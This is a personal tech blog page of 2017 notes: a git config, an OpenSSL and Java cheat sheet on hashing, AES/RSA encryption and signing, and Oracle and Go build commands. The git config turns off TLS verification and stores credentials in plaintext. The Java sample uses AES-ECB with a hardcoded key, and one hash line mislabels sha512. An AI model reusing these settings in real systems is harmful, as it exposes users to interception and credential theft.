ci=commit</span><br><span class="line">  co=checkout</span><br><span class="line">  br=branch</span><br><span class="line">  di=difftool</span><br><span class="line">  mt=mergetool</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">  url = https://192.168.1.107/git/my-repo.git</span><br><span class="line">  fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[remote &quot;usb&quot;]</span><br><span class="line">  url = G:\\share_drive\\Other\\my-repo.git</span><br><span class="line">  fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line"></span><br><span class="line">[diff]</span><br><span class="line">    tool = bc3</span><br><span class="line">[difftool]</span><br><span class="line">    prompt = false</span><br><span class="line">[difftool &quot;bc3&quot;]</span><br><span class="line">    #use cygpath to transform cygwin path $LOCAL (something like /tmp/U5VvP1_abc) to windows path, because bc3 is a windows software</span><br><span class="line">    #cmd = \&quot;c:/program files/beyond compare 3/bcomp.exe\&quot; &quot;$(cygpath -w $LOCAL)&quot; &quot;$REMOTE&quot;</span><br><span class="line">    cmd = \&quot;C:/Software/Beyond Compare 3/bcomp.exe\&quot; \&quot;$LOCAL\&quot; \&quot;$REMOTE\&quot;</span><br><span class="line">[merge]</span><br><span class="line">    tool = bc3</span><br><span class="line">[mergetool]</span><br><span class="line">    prompt = false</span><br><span class="line">[mergetool &quot;bc3&quot;]</span><br><span class="line">    #trustExitCode = true</span><br><span class="line">    cmd = \&quot;C:/Software/Beyond Compare 3/bcomp.exe\&quot; &quot;$LOCAL&quot; &quot;$REMOTE&quot; &quot;$BASE&quot; &quot;$MERGED&quot;</span><br><span class="line"></span><br><span class="line">[user]</span><br><span class="line">  name = Forrest Wan</span><br><span class="line">  email = forestwwk@gmail.com</span><br><span class="line">[http]</span><br><span class="line">  #proxy = http://proxy1.scig.gov.hk:8080</span><br><span class="line">  sslVerify=false</span><br><span class="line">[https]</span><br><span class="line">  #proxy = http://proxy1.scig.gov.hk:8080</span><br><span class="line">[credential]</span><br><span class="line">  helper = store</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Crypto-Hash-GPG" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-03-15T07:56:39.000Z"><a href="/2017/03/15/Crypto-Hash-GPG/">2017-03-15</a></time>
      
      
  
    <h1 class="title"><a href="/2017/03/15/Crypto-Hash-GPG/">Openssl Hash Crypto Sign Verify</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <h1 id="Random"><a href="#Random" class="headerlink" title="Random"></a>Random</h1><p><code>openssl rand -base64 32</code><br>&#x3D;&#x3D;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Generally, salt is produced with class SecureRandom</span><br><span class="line">SecureRandom random = new SecureRandom();</span><br><span class="line">byte[] salt = new byte[32];</span><br><span class="line">random.nextBytes(salt);</span><br></pre></td></tr></table></figure>
<p>Other ways</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">date +%s | sha256sum | base64 | head -c 32 ; echo</span><br><span class="line">date | md5sum</span><br><span class="line">tr -cd &#x27;[:alnum:]&#x27; &lt; /dev/urandom | fold -w30 | head -n1</span><br></pre></td></tr></table></figure>

<p>Reference<br><a target="_blank" rel="noopener" href="https://www.howtogeek.com/howto/30184/10-ways-to-generate-a-random-password-from-the-command-line/">https://www.howtogeek.com/howto/30184/10-ways-to-generate-a-random-password-from-the-command-line/</a></p>
<h1 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h1><h2 id="Encoding-with-hex-hexdump-or-xxd-x2F-base64-and-openssl-base64"><a href="#Encoding-with-hex-hexdump-or-xxd-x2F-base64-and-openssl-base64" class="headerlink" title="Encoding with hex(hexdump or xxd)&#x2F;base64 and openssl base64"></a>Encoding with hex(hexdump or xxd)&#x2F;base64 and openssl base64</h2><p><code>echo -n AP0PZxpsbyyrznZzeMkkEAPn726JmkgzwZrE5qwHKNY=|base64 -d &gt; salt.txt</code><br>&#x3D;&#x3D;&gt;<br><code>echo -n AP0PZxpsbyyrznZzeMkkEAPn726JmkgzwZrE5qwHKNY=|openssl base64 -d &gt; salt.txt</code></p>
<p><code>cat salt.txt|base64</code><br>&#x3D;&#x3D;&gt;<br><code>cat salt.txt|openssl base64</code> Display the character “AP0PZxpsbyyrznZzeMkkEAPn726JmkgzwZrE5qwHKNY&#x3D;”</p>
<p><code>hexdump -C salt.txt</code> OR <code>cat salt.txt |hexdump -C</code> OR <code>xxd salt.txt</code><br>&#x3D;&#x3D;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JAVA code</span><br><span class="line">BASE64Decoder decoder = new BASE64Decoder();</span><br><span class="line">for (byte b : decoder.decodeBuffer(&quot;AP0PZxpsbyyrznZzeMkkEAPn726JmkgzwZrE5qwHKNY=&quot;)) &#123;</span><br><span class="line">  System.out.printf(&quot;%02x&quot;, b); // same as encoded by xxd -p</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>To decode hexadecimal number, using <code>echo -n &#39;0: 50617373776f72643031&#39; | xxd -r</code> &#x3D;&gt; Password01 OR <code>echo -n 50617373776f72643031 | xxd -r -p</code></p>
<h2 id="Message-Digest-or-Hash-md5sum-sha1sum-sha256sum-and-openssl-md5-sha1-sha256-sha512"><a href="#Message-Digest-or-Hash-md5sum-sha1sum-sha256sum-and-openssl-md5-sha1-sha256-sha512" class="headerlink" title="Message Digest or Hash: md5sum, sha1sum, sha256sum and openssl md5, sha1, sha256, sha512"></a>Message Digest or Hash: md5sum, sha1sum, sha256sum and openssl md5, sha1, sha256, sha512</h2><p><code>md5sum salt.txt</code> &#x3D;&#x3D; <code>cat salt.txt |openssl md5</code> &#x3D;&#x3D; <code>openssl dgst -md5 -hex salt.txt</code> &#x3D;&#x3D; <code>openssl md5 &lt; salt.txt</code><br><code>sha1sum salt.txt</code> &#x3D;&#x3D; <code>cat salt.txt |openssl sha1</code> &#x3D;&#x3D; <code>openssl dgst -sha1 -hex salt.txt</code>  &#x3D;&#x3D; <code>openssl sha1 &lt; salt.txt</code><br><code>sha256sum salt.txt</code> &#x3D;&#x3D; <code>cat salt.txt |openssl sha256</code> &#x3D;&#x3D; <code>openssl dgst -sha256 -hex salt.txt</code> &#x3D;&#x3D; <code>openssl sha256 &lt; salt.txt</code><br><code>sha512sum salt.txt</code> &#x3D;&#x3D; <code>cat salt.txt |openssl sha256</code> &#x3D;&#x3D; <code>openssl dgst -sha512 -hex salt.txt</code> &#x3D;&#x3D; <code>openssl sha512 &lt; salt.txt</code></p>
<h2 id="Hash-password-with-salt-sha512-salt-password"><a href="#Hash-password-with-salt-sha512-salt-password" class="headerlink" title="Hash password with salt [sha512(salt+password)]"></a>Hash password with salt [sha512(salt+password)]</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo Password01 &gt; pass.txt (or with -n to remove the \n or using printf)</span><br><span class="line">cat salt.txt pass.txt &gt; combined.txt</span><br><span class="line">tr -d &#x27;\n&#x27; &lt; combined.txt &gt; combined2.txt // remove the \n</span><br><span class="line">sha512sum combined2.txt</span><br></pre></td></tr></table></figure>
<p>&#x3D;&#x3D;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">JAVA code</span><br><span class="line">MessageDigest md = MessageDigest.getInstance(&quot;SHA-512&quot;);</span><br><span class="line">BASE64Decoder decoder = new BASE64Decoder();</span><br><span class="line"></span><br><span class="line">ByteArrayOutputStream array = new ByteArrayOutputStream();</span><br><span class="line">array.write(d.decodeBuffer(&quot;AP0PZxpsbyyrznZzeMkkEAPn726JmkgzwZrE5qwHKNY=&quot;)); // salt</span><br><span class="line">array.write(&quot;Password01&quot;.getBytes()); // password</span><br><span class="line"></span><br><span class="line">/* Same as below</span><br><span class="line">md.update(d.decodeBuffer(&quot;AP0PZxpsbyyrznZzeMkkEAPn726JmkgzwZrE5qwHKNY=&quot;)); // salt</span><br><span class="line">md.update(&quot;Password01&quot;.getBytes()); // password</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">for (byte b : md.digest(array.toByteArray())) &#123;</span><br><span class="line">  System.out.printf(&quot;%02x&quot;, b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Encrypt-x2F-Decrypt"><a href="#Encrypt-x2F-Decrypt" class="headerlink" title="Encrypt&#x2F;Decrypt"></a>Encrypt&#x2F;Decrypt</h1><h2 id="Symmetric-crypto-with-AES"><a href="#Symmetric-crypto-with-AES" class="headerlink" title="Symmetric crypto with AES"></a>Symmetric crypto with AES</h2><h3 id="Encrypt-using-salt"><a href="#Encrypt-using-salt" class="headerlink" title="Encrypt using salt"></a>Encrypt using salt</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;randomprhase&quot; | openssl aes-128-cbc -out message.enc (default with salt)</span><br><span class="line">echo &quot;randomprhase&quot; | openssl aes-128-cbc -nosalt -out nosalt.enc (without salt)</span><br></pre></td></tr></table></figure>
<p>Reference: <a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/7303103/java-aes-encryption-with-salt">http://stackoverflow.com/questions/7303103/java-aes-encryption-with-salt</a></p>
<h3 id="Encryption-by-openssl-and-java"><a href="#Encryption-by-openssl-and-java" class="headerlink" title="Encryption by openssl and java"></a>Encryption by openssl and java</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n qkjll5@2md3gs5Q@|xxd -p ==&gt; 716b6a6c6c3540326d643367733551400a</span><br><span class="line"></span><br><span class="line">echo -n secret | openssl enc -aes-128-ecb -K 716b6a6c6c3540326d643367733551400a -a</span><br></pre></td></tr></table></figure>
<p>&#x3D;&gt;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">public class CipherTest &#123;</span><br><span class="line">    </span><br><span class="line">    private static final String ALGORITHM = &quot;AES/ECB/PKCS5Padding&quot;;</span><br><span class="line">    private static byte[] keyValue = &quot;qkjll5@2md3gs5Q@&quot;.getBytes(); // key length should be 16</span><br><span class="line"></span><br><span class="line">    public static String encrypt(String valueToEnc) throws Exception &#123;</span><br><span class="line">        Key key = generateKey();</span><br><span class="line">        Cipher c = Cipher.getInstance(ALGORITHM);</span><br><span class="line">        c.init(Cipher.ENCRYPT_MODE, key);</span><br><span class="line">        byte[] encValue = c.doFinal(valueToEnc.getBytes());</span><br><span class="line">        String encryptedValue = new BASE64Encoder().encode(encValue);</span><br><span class="line">        return encryptedValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static String decrypt(String encryptedValue) throws Exception &#123;</span><br><span class="line">        Key key = generateKey();</span><br><span class="line">        Cipher c = Cipher.getInstance(ALGORITHM);</span><br><span class="line">        c.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">        byte[] decordedValue = new BASE64Decoder().decodeBuffer(encryptedValue);</span><br><span class="line">        byte[] decValue = c.doFinal(decordedValue);</span><br><span class="line">        String decryptedValue = new String(decValue);</span><br><span class="line">        return decryptedValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static Key generateKey() throws Exception &#123;</span><br><span class="line">        Key key = new SecretKeySpec(keyValue, &quot;AES&quot;);</span><br><span class="line">        // SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(ALGORITHM);</span><br><span class="line">        // key = keyFactory.generateSecret(new DESKeySpec(keyValue));</span><br><span class="line">        return key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String password = &quot;secret&quot;;</span><br><span class="line">        String passwordEnc = CipherTest.encrypt(password);</span><br><span class="line">        String passwordDec = CipherTest.decrypt(passwordEnc);</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;Plain Text : &quot; + password);</span><br><span class="line">        System.out.println(&quot;Encrypted : &quot; + passwordEnc);</span><br><span class="line">        System.out.println(&quot;Decrypted : &quot; + passwordDec);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>For cbc or cfb, iv should be provided. In java code, the IvParameterSpec is need to define.</p>
<h3 id="Openssl-encryption-sample"><a href="#Openssl-encryption-sample" class="headerlink" title="Openssl encryption sample"></a>Openssl encryption sample</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;0: 63616e746765747468697332776f726b&#x27; | xxd -r | openssl enc -aes-128-ecb -a -K 00000000000000000000000000000000</span><br><span class="line">=&gt;</span><br><span class="line">N2+bVLU8fIS7ucFW1Qr/xwFD22PuZrDN/59pkXaAFR4= (base64 encoded with option -a)</span><br><span class="line"></span><br><span class="line">echo &#x27;0: 63616e746765747468697332776f726b&#x27; | xxd -r | openssl enc -aes-128-ecb -nopad -K 00000000000000000000000000000000|xxd -p</span><br><span class="line">=&gt;</span><br><span class="line">376f9b54b53c7c84bbb9c156d50affc7 (hex encoded with options -nopad, and xxd -p)</span><br><span class="line"></span><br><span class="line">echo &#x27;0: 63616e746765747468697332776f726b&#x27; | xxd -r | openssl enc -aes-128-ecb -nopad -K 00000000000000000000000000000000|xxd |cut -c10-50</span><br><span class="line">=&gt;</span><br><span class="line">376f 9b54 b53c 7c84 bbb9 c156 d50a ffc7 (hex encoded with cut -c10-50)</span><br><span class="line"></span><br><span class="line">echo -n &#x27;63616e746765747468697332776f726b&#x27; | xxd -r -p | openssl enc -aes-128-ecb -nopad -K 00000000000000000000000000000000|xxd |cut -c10-50</span><br><span class="line">=&gt;</span><br><span class="line">376f 9b54 b53c 7c84 bbb9 c156 d50a ffc7 (xxd -r -p and hex encoded with cut -c10-50)</span><br></pre></td></tr></table></figure>
<p>Reference: <a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/38082644/how-to-generate-the-output-in-hexadecimal-in-openssl">http://stackoverflow.com/questions/38082644/how-to-generate-the-output-in-hexadecimal-in-openssl</a></p>
<h2 id="Asymmetric-crypto-with-RSA"><a href="#Asymmetric-crypto-with-RSA" class="headerlink" title="Asymmetric crypto with RSA"></a>Asymmetric crypto with RSA</h2><h3 id="Generate-key-publicKey"><a href="#Generate-key-publicKey" class="headerlink" title="Generate key, publicKey"></a>Generate key, publicKey</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out key.pem</span><br><span class="line">openssl rsa -in key.pem -pubout &gt; key-pub.pem</span><br><span class="line"></span><br><span class="line">openssl rsautl -encrypt -in pass.txt -pubin -inkey key-pub.pem -out pass.encrypted</span><br><span class="line">openssl rsautl -decrypt -in pass.encrypted -inkey key.pem</span><br></pre></td></tr></table></figure>

<h3 id="Encrypt-x2F-decrypt-with-base64-x2F-hex-encode-x2F-decode-Interesting"><a href="#Encrypt-x2F-decrypt-with-base64-x2F-hex-encode-x2F-decode-Interesting" class="headerlink" title="Encrypt&#x2F;decrypt with base64&#x2F;hex encode&#x2F;decode (Interesting)"></a>Encrypt&#x2F;decrypt with base64&#x2F;hex encode&#x2F;decode (Interesting)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo -n test | openssl rsautl -encrypt -pubin -inkey key-pub.pem | base64 | base64 -d|openssl rsautl -decrypt -inkey key.pem =&gt; test</span><br><span class="line"></span><br><span class="line">echo -n test | openssl rsautl -encrypt -pubin -inkey key-pub.pem | xxd -p | xxd -r -p |openssl rsautl -decrypt -inkey key.pem =&gt; test</span><br></pre></td></tr></table></figure>
<p>Java: <a target="_blank" rel="noopener" href="https://javadigest.wordpress.com/2012/08/26/rsa-encryption-example/">https://javadigest.wordpress.com/2012/08/26/rsa-encryption-example/</a></p>
<h1 id="Sign-x2F-Verify"><a href="#Sign-x2F-Verify" class="headerlink" title="Sign&#x2F;Verify"></a>Sign&#x2F;Verify</h1><h2 id="Generate-key-publicKey-1"><a href="#Generate-key-publicKey-1" class="headerlink" title="Generate key, publicKey"></a>Generate key, publicKey</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out key.pem</span><br><span class="line">openssl rsa -in key.pem -pubout &gt; key-pub.pem</span><br></pre></td></tr></table></figure>

<h2 id="Sign-x2F-Verify-a-file-with-openssl-dgst"><a href="#Sign-x2F-Verify-a-file-with-openssl-dgst" class="headerlink" title="Sign&#x2F;Verify a file with openssl dgst"></a>Sign&#x2F;Verify a file with openssl dgst</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl dgst -sha256 -sign key.pem -out pass.sign pass.txt</span><br><span class="line">openssl dgst -sha256 -verify key-pub.pem -signature pass.sign pass.txt</span><br></pre></td></tr></table></figure>

<h2 id="Sign-x2F-Verify-a-file-with-openssl-rsautl"><a href="#Sign-x2F-Verify-a-file-with-openssl-rsautl" class="headerlink" title="Sign&#x2F;Verify a file with openssl rsautl"></a>Sign&#x2F;Verify a file with openssl rsautl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -sign -inkey key.pem -out pass.rsa -in pass.txt</span><br><span class="line">openssl rsautl -verify -inkey key-pub.pem -in pass.rsa -pubin</span><br><span class="line">openssl rsautl -verify -inkey key-pub.pem -in pass.sign -pubin</span><br></pre></td></tr></table></figure>

<h1 id="GPG"><a href="#GPG" class="headerlink" title="GPG"></a>GPG</h1><p>Convert keys between GnuPG, OpenSsh and OpenSSL<br><a target="_blank" rel="noopener" href="http://sysmic.org/dotclear/index.php?post/2010/03/24/Convert-keys-betweens-GnuPG,-OpenSsh-and-OpenSSL">http://sysmic.org/dotclear/index.php?post/2010/03/24/Convert-keys-betweens-GnuPG%2C-OpenSsh-and-OpenSSL</a></p>
<h1 id="Other-openssl-command"><a href="#Other-openssl-command" class="headerlink" title="Other openssl command"></a>Other openssl command</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ssh public key stored in .ssh folder: </span><br><span class="line">ssh-keygen -f koding -y &gt; koding_id_rsa.pub (openssl genrsa -out key.pem)</span><br><span class="line"></span><br><span class="line">show public key from the private key</span><br><span class="line">openssl rsa -in koding -pubout &gt; koding-pub.pem</span><br><span class="line"></span><br><span class="line">show -modulus from the private key</span><br><span class="line">openssl rsa -in key.pem -noout -modulus</span><br><span class="line"></span><br><span class="line">p12 file (usually with .pfx extension) contains certificate, public key, private key</span><br><span class="line">openssl x509 - for certificate</span><br><span class="line">openssl x509 -inform der -in certificate.cer -out certificate.pem (with -pubkey -noout to print public key only)</span><br><span class="line"></span><br><span class="line">openssl pkcs12 - for p12 file</span><br><span class="line">openssl pkcs12 -in certificate.pfx -out certificate.cer -nodes -passin pass:&quot;3228474250821687&quot; | openssl x509 -noout -subject</span><br><span class="line">keytool -list -v -keystore P_DS_WONGTWOMANA1136227_Valid785781e3_123.p12 -storepass 123 -storetype pkcs12</span><br><span class="line"></span><br><span class="line">openssl rsa - for private key</span><br><span class="line">openssl rsa -in koding -out koding2 (Remove a passphrase from a private key)</span><br><span class="line"></span><br><span class="line">openssl req - for private key and csr related</span><br><span class="line">openssl req -out koding.csr -key koding -new</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">scratch domain csr</span><br><span class="line">openssl req -new -sha256 -key scratch.key -subj &quot;/CN=www.scratch.hk&quot; &gt; scratch.csr</span><br><span class="line">openssl req -new -sha256 -key scratch.key -subj &quot;/&quot; -reqexts SAN -config &lt;(cat /etc/ssl/openssl.cnf &lt;(printf &quot;[SAN]\nsubjectAltName=DNS:scratch.hk,DNS:www.scratch.hk&quot;)) &gt; scratch.csr</span><br><span class="line"></span><br><span class="line">protocal: ssh, ssl </span><br><span class="line">symmetric cryptographic algorithm : aes, des, 3des</span><br><span class="line">asymmetric cryptographic algorithm: rsa, dsa</span><br><span class="line">hash    : crc32, md5, sha1, sha256, sha512</span><br><span class="line">aes/des加密速度快,适合大量数据,des容易破解,一般用3重des,后来又出现了更快更安全的aes</span><br><span class="line">rsa是公钥加密,速度慢,只能处理少量数据,优点是公钥即使在不安全的网络上公开,也能保证安全</span><br><span class="line">常见情况是双方用rsa协商出一个密钥后通过aes/3des给数据加密</span><br><span class="line"></span><br><span class="line">=========</span><br><span class="line">Using a car analogy:</span><br><span class="line"></span><br><span class="line">PGP     is a car</span><br><span class="line">OpenPGP is the design for the PGP car</span><br><span class="line">GnuPG   is another car using the same design</span><br><span class="line">RSA     is a diesel engine, and other engines are available</span><br><span class="line">SSH     isn&#x27;t a car at all. But it uses engines.</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://program-think.blogspot.com/2010/06/howto-prevent-hacker-attack-3.html">https://program-think.blogspot.com/2010/06/howto-prevent-hacker-attack-3.html</a></p>
<h1 id="Golang"><a href="#Golang" class="headerlink" title="Golang"></a>Golang</h1><p>encoding&#x2F;json, csv, xml, hex, base64<br>crypto&#x2F;aes, des, rsa, dsa, md5, sha1, sha256, sha512, x509  </p>
<h1 id="New-command-to-learn"><a href="#New-command-to-learn" class="headerlink" title="New command to learn"></a>New command to learn</h1><p><code>tr, xxd</code></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Move-To-Anthor-Tablespace" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-03-14T02:56:39.000Z"><a href="/2017/03/14/Move-To-Anthor-Tablespace/">2017-03-14</a></time>
      
      
  
    <h1 class="title"><a href="/2017/03/14/Move-To-Anthor-Tablespace/">Move To Anthor Tablespace</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p>– ALTER TABLESPACE PRLS_DATA OFFLINE NORMAL;</p>
<p>select ‘ALTER TABLE ‘ || OWNER || ‘.’ || TABLE_NAME  || ‘ MOVE TABLESPACE ‘ || ‘DESTINATION_TABLESPACE’ || ‘;’ from DBA_TABLES WHERE OWNER &#x3D; ‘XX’;</p>
<p>select ‘ALTER INDEX ‘ || OWNER || ‘.’ || INDEX_NAME || ‘ REBUILD TABLESPACE ‘ || ‘DESTINATION_TABLESPACE’ || ‘;’ from DBA_INDEXES WHERE OWNER &#x3D; ‘XX’;</p>
<p>– ALTER TABLESPACE PRLS_DATA ONLINE;</p>
<p>Change default tablespace<br>alter user xx<br>default tablespace DESTINATION_TABLESPACE;</p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Cross-Compile-Go-File" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-03-02T09:38:56.000Z"><a href="/2017/03/02/Cross-Compile-Go-File/">2017-03-02</a></time>
      
      
  
    <h1 class="title"><a href="/2017/03/02/Cross-Compile-Go-File/">Cross Compile Go File</a></h1>
  

    </header>
    <div class="e-content entry" itemprop="articleBody">
      
        <p><code>sudo apt-get install gcc-arm-linux-gnueabihf</code></p>
<p><code>sudo apt-get install gcc-multilib g++-multilib</code> Fix “fatal error: ‘sys&#x2F;cdefs.h’ file not found # include &lt;sys&#x2F;cdefs.h&gt;</p>
<p><code>sudo apt-get install linux-headers-generic</code> Fix “fatal error: asm&#x2F;errno.h: No such file or directory”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CC=arm-linux-gnueabihf-gcc GOOS=linux GOARCH=arm GOARM=6 CGO_ENABLED=1 GOPATH=/opt/software/SimpleComputerRemote/Host GOROOT=/opt/software/go1.7 /opt/software/go1.7/bin/go env</span><br><span class="line"></span><br><span class="line">CC=arm-linux-gnueabihf-gcc GOOS=linux GOARCH=arm GOARM=6 CGO_ENABLED=1 GOPATH=/opt/software/SimpleComputerRemote/Host GOROOT=/opt/software/go1.7 /opt/software/go1.7/bin/go build -o bin/server-linux-arm.out -ldflags=&quot;-s -w&quot; src/Rekap\ Remote\ Server.go</span><br><span class="line"></span><br><span class="line">CC=arm-linux-gnueabihf-gcc GOOS=linux GOARCH=arm GOARM=6 CGO_ENABLED=1 GOPATH=/opt/software/SimpleComputerRemote/Host GOROOT=/opt/software/go1.5 /opt/software/go1.5/bin/go build -o bin/server-linux-arm.out -ldflags=&quot;-s -w&quot; src/Rekap\ Remote\ Server.go</span><br></pre></td></tr></table></figure>

<p>At the end, but fail to cross compile the SimpleComputerRemote project, so this article is just for reference.</p>
<p>Reference<br><a target="_blank" rel="noopener" href="http://linux-sunxi.org/Toolchain">http://linux-sunxi.org/Toolchain</a><br><a target="_blank" rel="noopener" href="https://www.raspberrypi.com.tw/405/using-a-cross-compiler-for-raspberry-pi/">[進階] 安裝 Raspberry Pi 的 Toolchain</a><br><a target="_blank" rel="noopener" href="http://www.veryarm.com/296.html">http://www.veryarm.com/296.html</a><br><a target="_blank" rel="noopener" href="https://github.com/jasonblog/note/blob/master/toolchain/173.md">arm交叉編譯器gnueabi、none-eabi、arm-eabi、gnueabihf、gnueabi區別</a></p>

      
    </div>
    <footer>
      
        
        
      
      <div class="clearfix"></div>
    </footer>
  </div>
</article>




  <article id="post-Setup-Minidlna-omxplayer-bluetooth-on-RPi" class="h-entry post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time class="dt-published" datetime="2017-01-19T09:22:55.000Z"><a href="/2017/01/19/Setup-Minidlna-omxplayer-bluetooth-on-RPi/">2017-01-19</a></time>
      
      
  
    <h1 class="title"><a href="/2017/01/19/Setup-Minidlna-omxplayer-bluetooth-on-RPi/">Setup Minidlna omxplayer bluetooth on RPi</a></h1>
  

